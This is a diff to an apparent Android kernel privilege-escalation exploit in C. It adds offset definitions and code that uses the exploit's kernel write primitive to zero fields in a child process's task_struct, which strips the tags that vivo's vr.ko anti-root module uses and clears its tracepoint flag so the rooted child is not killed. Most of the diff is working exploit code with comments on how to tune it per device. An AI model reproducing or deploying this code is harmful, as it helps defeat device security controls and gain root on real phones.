@@ -81,6 +81,19 @@ static enum soc_family detect_soc(void) {
 
 /* Override struct field offsets (task_struct, etc.) with per-device values */
 #include "runtime_struct_offsets.h"
+/* VR.ko anti-root fallback defines */
+#ifndef VR_TAG_A_OFF
+#define VR_TAG_A_OFF           0x06
+#endif
+#ifndef VR_TAG_B_OFF
+#define VR_TAG_B_OFF           0x2c
+#endif
+#ifndef VR_SYSCALL_TP_FLAG
+#define VR_SYSCALL_TP_FLAG     0x400ULL
+#endif
+#ifndef TASK_THREAD_INFO_FLAGS_OFF
+#define TASK_THREAD_INFO_FLAGS_OFF 0x00
+#endif
 #include "offsets_json.h"
 
 static struct kernel_offsets g_external_offsets;
@@ -978,6 +991,43 @@ int run_exploit(int argc, char **argv) {
     }
 
     pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
+    #ifdef VR_TAG_A_OFF
+  /* ------------------------------------------------------------------
+   * vivo vr.ko anti-root per-task bypass (ported from root.c)
+   * ------------------------------------------------------------------
+   * vr.ko tags every app-origin task at fork/clone time. When the task
+   * later holds euid 0, the sys_exit tracepoint probe kills it. We must
+   * strip the tag BEFORE W2 verify runs the child's getuid().
+   *
+   * This exploit primitive is 64-bit granular, so:
+   *   – task+0x00 (thread_info.flags) covers tag A at +0x06 and also
+   *     clears the VR_SYSCALL_TP_FLAG bit (0x400). This takes the task
+   *     off the sys_exit slow-path immediately.
+   *   – tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
+   *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
+   *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
+   * ------------------------------------------------------------------ */
+  {
+    int vr_ok = 1;
+
+    /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
+    vr_ok &= do_one_write(child_task + TASK_THREAD_INFO_FLAGS_OFF,
+                          "VR: flags+tagA", 1, 1);
+
+    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
+    if (vr_ok) {
+      uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
+      vr_ok &= do_one_write(tagb_align, "VR: tagB", 1, 1);
+    }
+
+    if (vr_ok) {
+      pr_success("VR.ko per-task tags cleared\n");
+    } else {
+      pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
+    }
+  }
+#endif
+
     pselect_child_node = 1;
 
     int got_root = retry_write_stage(
